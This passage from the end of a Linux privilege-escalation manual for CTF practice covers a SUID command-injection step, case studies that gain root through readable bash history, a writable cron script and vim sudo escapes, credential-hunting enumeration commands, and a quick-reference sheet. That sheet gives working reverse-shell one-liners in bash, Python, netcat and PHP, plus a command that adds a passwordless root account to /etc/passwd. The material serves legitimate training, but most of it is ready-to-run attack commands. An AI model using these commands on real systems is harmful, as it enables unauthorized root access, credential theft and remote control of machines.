# If we control service_name, we control the argument to system()
# Inject a command:
echo "service_name=nginx; bash -p #" > /etc/admin.conf

# Step 5: Run the SUID binary
/usr/local/bin/admin_tool
# It reads admin.conf → service_name = "nginx; bash -p #"
# Executes: /usr/bin/service nginx; bash -p # restart
# bash -p runs with EUID=root → ROOT SHELL!
```

---

# Bonus F — Real CTF Case Studies

## F.1 Case Study: Finding the Vector When Everything Looks Clean

**Scenario:** You land on a machine as `www-data`. sudo -l shows nothing. No interesting SUID. No writable cron scripts. linpeas found nothing critical. You've been stuck for 30 minutes. What do you actually do?

```
THE METHODICAL UNSTICK PROCESS:

1. Check EVERY user that has a shell
   cat /etc/passwd | grep -vE "nologin|false|sync|halt|shutdown"
   → Found: alice, bob, mysql — three real users

2. Check what each user's home contains (readable files)
   ls -la /home/alice/ /home/bob/
   → /home/alice/.bash_history is readable (permissions mistake!)
   cat /home/alice/.bash_history
   → "mysql -u alice -p supersecret123"
   → Found credential: alice:supersecret123

3. Try credential everywhere
   su alice          → Works! Password: supersecret123
   sudo -l           → (root) NOPASSWD: /usr/bin/python3 !
   sudo python3 -c 'import os; os.system("/bin/bash")'
   → ROOT!

LESSON: The vector was not a technical exploit.
        It was a misread file permission on .bash_history.
        The unstick process is to read every user's data carefully.
```

## F.2 Case Study: The Invisible Cron Job

**Scenario:** You suspect a cron job but `/etc/crontab` is empty and `crontab -l` shows nothing.

```
CHECKING ALL CRON LOCATIONS:
cat /etc/crontab                    # Empty
crontab -l                          # No crontab for www-data
ls /etc/cron.d/                     # Nothing
ls /etc/cron.daily/                 # Some standard scripts

But wait — run pspy:
./pspy64 -i 100

After 2 minutes of watching:
2024/01/01 12:01:01 CMD: UID=0   PID=12345  | /bin/bash /opt/.hidden/cleanup.sh

Found it! A script in /opt/.hidden/ running as root every minute.
ls -la /opt/.hidden/cleanup.sh
# -rwxrwxrwx 1 root root ... cleanup.sh ← WORLD WRITABLE!

echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> /opt/.hidden/cleanup.sh
# Wait 1 minute...
/tmp/b -p    → ROOT!

LESSON: Not all cron jobs are in /etc/crontab.
        They can be anywhere — /opt/, /var/, /home/.
        pspy finds them all regardless of location.
```

## F.3 Case Study: The Rabbit Hole Trap

**Scenario:** You spend 2 hours on a complex path that goes nowhere.

```
What happened:
  Found an SUID binary with an old CVE from 2015.
  Spent 2 hours trying to get the exploit working.
  The exploit only works on 32-bit systems and target is 64-bit.
  The binary was patched anyway.

What you should have done instead:
  Set a 20-minute timer per exploitation attempt.
  After 20 minutes of no progress on the CVE:
    → Move to next finding
    → Run pspy (hadn't done this yet)
    → Check /home directories more carefully
    → There was a writable cron script that took 2 minutes to exploit

The rule: No single exploitation attempt should take more than 20-30 minutes.
If it's not working after 20 minutes, it's either:
  a) Not the intended path
  b) You're missing something fundamental
  c) Needs a different approach

Pivot. Come back later with fresh eyes.
```

## F.4 Case Study: Chaining Three Small Weaknesses

**Scenario:** No single big vulnerability exists. But three small issues combine into root.

```
Finding 1: bob's password is in his bash history (MySQL command)
Finding 2: bob can run /usr/bin/vim /var/log/app.log as root (sudo)
Finding 3: /var/log/app.log doesn't exist yet (creates it fresh each time)

Individually:
  Finding 1 alone: just bob's MySQL password
  Finding 2 alone: can only edit one specific log file (seems harmless)
  Finding 3 alone: irrelevant

Chained:
  su bob (using found password)
  sudo /usr/bin/vim /var/log/app.log
  → vim opens as root creating a new file
  → :!/bin/bash  (vim shell escape — runs as root!)
  → ROOT

LESSON: Most real machines require chaining.
        When you can't find a single big exploit,
        map EVERY capability and EVERY finding onto paper.
        Then look for chains.

CHAIN MAP TEMPLATE:
┌─────────────────────────────────────────┐
│ What I have:                            │
│   → www-data shell                      │
│   → Can read /home/bob/.bash_history    │
│   → Bob's MySQL password                │
│                                         │
│ What I can get:                         │
│   → su bob (using password)             │
│   → bob's sudo rights                   │
│                                         │
│ What bob can do:                        │
│   → sudo vim /var/log/app.log           │
│   → vim shell escape                    │
│   → ROOT                                │
└─────────────────────────────────────────┘
```

## F.5 The "Why Isn't This Working?" Checklist

When an exploit that should work isn't working:

```
COMMON REASONS EXPLOITS FAIL:

[ ] Wrong architecture? (32-bit exploit on 64-bit binary)
    file /path/to/binary | grep "32\|64"

[ ] Wrong OS/kernel version?
    uname -a && cat /etc/os-release

[ ] Binary is patched?
    md5sum binary; compare to known vulnerable hash

[ ] Missing dependency?
    ldd exploit_binary 2>&1 | grep "not found"

[ ] Permissions wrong?
    ls -la /tmp/exploit  # Must be executable

[ ] /tmp is mounted noexec?
    mount | grep /tmp | grep noexec
    # If so: use /dev/shm or /var/tmp instead

[ ] Wrong working directory?
    Some exploits need to run from a specific directory
    cd /tmp && ./exploit

[ ] ASLR enabled?
    cat /proc/sys/kernel/randomize_va_space
    # 0=off, 1=conservative, 2=full

[ ] Stack canaries?
    checksec --file=./binary

[ ] SELinux/AppArmor blocking?
    getenforce 2>/dev/null  # SELinux status
    aa-status 2>/dev/null   # AppArmor status

[ ] Compile error in exploit source?
    gcc -m32 exploit.c -o exploit  # 32-bit compile
    gcc exploit.c -o exploit -lpthread  # With pthreads
    gcc exploit.c -o exploit -static   # Static linking

[ ] Network connectivity issue?
    # For reverse shell — can target reach you?
    # Test: bash -c 'echo test > /dev/tcp/LHOST/LPORT'
    # Listen: nc -lvnp LPORT

[ ] Python2 vs Python3 mismatch?
    python --version; python3 --version
    # Specify: python2 exploit.py or python3 exploit.py
```

---

# Bonus G — Advanced Enumeration: Things linpeas Misses

## G.1 Manual Checks That Automated Tools Skip

```bash
# ===== RECENTLY INSTALLED PACKAGES =====
# Something installed recently might have weak permissions or known CVEs
cat /var/log/dpkg.log | grep "install " | tail -20   # Debian/Ubuntu
rpm -qa --last | head -20                              # Red Hat/CentOS

# ===== RUNNING SERVICES WITH OPEN FILES =====
# Find which process is using each port — sometimes reveals more than ss
lsof -i -P -n 2>/dev/null | grep LISTEN

# ===== MAIL =====
# Users often have credentials in their mail
cat /var/mail/www-data 2>/dev/null
cat /var/mail/root 2>/dev/null
ls /var/mail/ 2>/dev/null
ls /var/spool/mail/ 2>/dev/null

# ===== INSTALLED SOFTWARE IN NON-STANDARD PATHS =====
find /usr/local /opt /srv /app /data -type f -executable 2>/dev/null | head -30
ls -la /usr/local/bin/ /usr/local/sbin/

# ===== WORLD-READABLE PRIVATE KEYS =====
find / -name "*.pem" -o -name "*.key" -o -name "*.p12" 2>/dev/null | while read f; do
    perm=$(stat -c "%a" "$f" 2>/dev/null)
    echo "$perm $f"
done | grep -v "^[46][04][04]"  # Show keys that are TOO readable

# ===== SYSTEMD UNIT FILE ENVIRONMENT VARS =====
# Services often have credentials in their unit files
grep -r "Environment\|EnvironmentFile" /etc/systemd/ /lib/systemd/ 2>/dev/null | \
    grep -iE "pass|secret|key|token"

# ===== ANSIBLE FACTS AND VAULT FILES =====
find / -name "*.vault" -o -name ".vault_pass" -o -name "vault_password_file" 2>/dev/null
find /etc/ansible /opt/ansible /home -name "*.yml" 2>/dev/null | \
    xargs grep -l "ansible_become_pass\|ansible_password" 2>/dev/null

# ===== PYTHON EGG-LINK FILES =====
# Editable Python installs — may be writable and importable
find / -name "*.egg-link" 2>/dev/null | xargs cat 2>/dev/null

# ===== READABLE SHADOW BACKUP =====
ls -la /etc/shadow- /etc/passwd- 2>/dev/null    # Backup files — sometimes more permissive

# ===== TIMERS (MODERN CRON EQUIVALENT) =====
systemctl list-timers --all 2>/dev/null
find /etc/systemd /lib/systemd -name "*.timer" 2>/dev/null | xargs cat 2>/dev/null

# ===== DBUS SERVICES =====
# Some D-Bus services accept root commands from unprivileged users
busctl list 2>/dev/null | grep -v "^NAME\|dbus\|systemd\|org.free"

# ===== CAPABILITIES ON RUNNING PROCESSES =====
# Even if no files have caps, running processes might:
cat /proc/*/status 2>/dev/null | grep -A1 "^Name:\|^CapEff:" | \
    grep -B1 "CapEff:.*[^0]00$" | grep "^Name:"

# ===== KERNEL MODULES =====
# Loaded kernel modules — any custom/suspicious ones?
lsmod | grep -v "^Module"
# Can you load modules?
ls -la /sbin/insmod /sbin/modprobe
# Check for writable module paths:
find /lib/modules/$(uname -r) -writable 2>/dev/null

# ===== WRITABLE /proc ENTRIES =====
# Some kernel tunables can be abused
ls -la /proc/sys/kernel/core_pattern   # If writable — kernel exploit primitive
cat /proc/sys/kernel/core_pattern      # Where core dumps go
# If: |/path/to/script — and script is writable → crash a SUID → code exec as root

# ===== CONTAINER ESCAPE CHECKS =====
# More thorough than just /.dockerenv
cat /proc/1/cgroup 2>/dev/null | grep -q "docker\|lxc\|kubepods" && echo "IN CONTAINER"
ls /sys/fs/cgroup/memory/docker 2>/dev/null && echo "Docker cgroup found"
cat /proc/mounts | grep -E "overlay|aufs" && echo "Likely container filesystem"
```

## G.2 The Anti-Stuck Framework

When you are completely stuck and have done everything:

```
LEVEL 1 — RECHECK (0-10 min):
  Re-read your nmap output word by word
  Re-read your gobuster output — any 403s you didn't check?
  403 = exists but forbidden — sometimes has exploitable content
  curl -v http://TARGET/forbidden_path/ -X OPTIONS
  curl -v http://TARGET/forbidden_path/ -X TRACE

LEVEL 2 — EXPAND SCOPE (10-20 min):
  Are there vhosts? Try: curl -H "Host: admin.TARGET.htb" TARGET
  Are there other ports? Try: nmap -p- again with slower settings
  UDP scan: sudo nmap -sU --top-ports 50 TARGET
  Did gobuster finish? What status codes are at 301?
  Try extensions you haven't tried: .asp .aspx .txt .xml .json .config

LEVEL 3 — REFRAME (20-30 min):
  What if the web vulnerability is not in the obvious place?
  Check every page source for: comments, hidden forms, version numbers
  Check every JS file: grep for endpoints, API keys, paths
  Try: curl http://TARGET/api/ http://TARGET/v1/ http://TARGET/rest/
  Try SQLi on EVERY parameter you've seen — not just login forms

LEVEL 4 — BRUTE (30-40 min):
  Username enumeration: smtp-user-enum, ssh timing, web response diff
  Password brute if you have a username: hydra with rockyou
  Directory brute with bigger wordlist:
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt

LEVEL 5 — GET FRESH EYES (take a break):
  Stop. Make tea/coffee. Come back in 15 minutes.
  You will notice something you missed.
  The brain needs to reset.
  Most people find their solution within 5 minutes of returning.
```

---

# 🔖 QUICK REFERENCE BOOKMARKS

> Copy these anchor links to jump to sections you use most often.

```
FASTEST PRIVESC CHECKS (first 60 seconds on any box):
  sudo -l                          → Chapter 15
  find / -perm -4000 2>/dev/null   → Chapter 11
  getcap -r / 2>/dev/null          → Chapter 12
  cat /etc/crontab                 → Chapter 13

MOST COMMON INITIAL ACCESS:
  LFI → log poisoning              → Chapter 0b.3.2
  File upload bypass               → Chapter 0b.3.5
  Default credentials              → Chapter 0d.1
  SQLi authentication bypass       → Chapter 0b.3.1

REVERSE SHELL CHEATSHEET:
  Bash:   bash -i >& /dev/tcp/IP/PORT 0>&1
  Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
  nc:     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT>/tmp/f
  php:    php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

SHELL STABILIZE:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z → stty raw -echo → fg → reset → export TERM=xterm-256color

WRITE ROOT USER (/etc/passwd writable):
  echo 'x::0:0::/root:/bin/bash' >> /etc/passwd && su x

STUCK? DECISION TREE: Chapter 36.1
FULL CHECKLIST:        Chapter 34
COMMAND CARD:          Chapter 35
MACHINE METHODOLOGY:   Chapter 39
THM FREE ROOMS:        Chapter 40
HTB FREE MACHINES:     Chapter 41
VULNHUB VMS:           Chapter 42
```

---

*This manual is intended for ethical hacking, CTF competitions, and authorized penetration testing only.*
*Always obtain explicit written permission before testing any system you do not own.*
*Understanding offensive techniques makes better defenders.*

---

```
 ██████╗  ██████╗  ██████╗ ████████╗    ██████╗  ██████╗  ██████╗ ████████╗
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
 ██████╔╝██║   ██║██║   ██║   ██║       ██████╔╝██║   ██║██║   ██║   ██║
 ██╔══██╗██║   ██║██║   ██║   ██║       ██╔══██╗██║   ██║██║   ██║   ██║
 ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██║  ██║╚██████╔╝╚██████╔╝   ██║
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝

  Linux Privilege Escalation: The Complete Field Manual
  Zero to Root | Zero to Foothold | Every Technique | Every Machine
  Chapters 0–43 + Bonus A–G
```

*End of Linux Privilege Escalation: The Complete Field Manual*
